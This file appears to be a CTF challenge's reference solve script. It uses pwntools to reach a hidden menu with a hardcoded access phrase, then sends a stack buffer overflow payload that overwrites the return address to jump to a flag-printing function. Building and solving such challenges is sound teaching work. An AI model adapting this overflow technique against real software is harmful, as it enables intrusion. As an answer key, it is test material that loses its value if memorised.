#!/usr/bin/env python3
"""
solve.py - Reference exploit for matrix://root_access

Usage:
    python3 solve.py              # connect to local ./chall
    python3 solve.py HOST PORT    # connect to remote instance

Requires pwntools (pip install pwntools --break-system-packages)
"""

import sys
import re
from pwn import process, remote, ELF, p64, context

SECRET_PHRASE = "RED_PILL_BLUE_PILL"  # for local testing only; differs per team in real deploy
BINARY_PATH = "./chall"

context.log_level = "info"


def get_win_address(path):
    """
    On a non-stripped build, pull the address straight from the symbol
    table. On the stripped player-facing binary, this is exactly the
    address a player would recover via Ghidra/IDA after locating the
    become_the_one() function by its body (fopen("/flag.txt") + fgets
    loop), since the binary is compiled with -no-pie and addresses are
    fixed across builds.
    """
    elf = ELF(path)
    if "become_the_one" in elf.symbols:
        return elf.symbols["become_the_one"]
    return 0x4016B8  # recovered via static analysis on the stripped binary


def main():
    win_addr = get_win_address(BINARY_PATH)
    print(f"[+] become_the_one() @ {hex(win_addr)}")

    if len(sys.argv) >= 3:
        io = remote(sys.argv[1], int(sys.argv[2]))
    else:
        io = process(BINARY_PATH)

    # Step 1: trigger the hidden diagnostic menu option
    io.recvuntil(b"Choice:")
    io.sendline(b"1337")

    # Step 2: supply the access phrase recovered via reverse engineering
    io.recvuntil(b"Enter access phrase:")
    io.sendline(SECRET_PHRASE.encode())

    resp = io.recvuntil(b"Choice:", timeout=3)
    if b"ACCESS GRANTED" not in resp:
        print("[-] Access denied -- wrong phrase for this build.")
        print(resp.decode(errors="replace"))
        io.close()
        return

    print("[+] Access granted, inside Morpheus Console")

    # Step 3: choose "Send Transmission"
    io.sendline(b"2")
    io.recvuntil(b">")

    # Step 4: overflow.
    # message[64] -> 64 bytes padding to reach saved RBP,
    # +8 bytes to overwrite saved RBP itself,
    # then overwrite the return address with become_the_one().
    payload = b"A" * 64 + b"B" * 8 + p64(win_addr)
    io.sendline(payload)

    io.recvuntil(b"Transmission sent.")

    # Step 5: function returns -> jumps to become_the_one() -> prints flag
    output = io.recvall(timeout=3).decode(errors="replace")
    print(output)

    match = re.search(r"WarCTF\{[^}]+\}", output)
    if match:
        print(f"\n[+] FLAG: {match.group(0)}")
    else:
        print("\n[-] Flag pattern not found in output -- check container's /flag.txt setup")

    io.close()


if __name__ == "__main__":
    main()
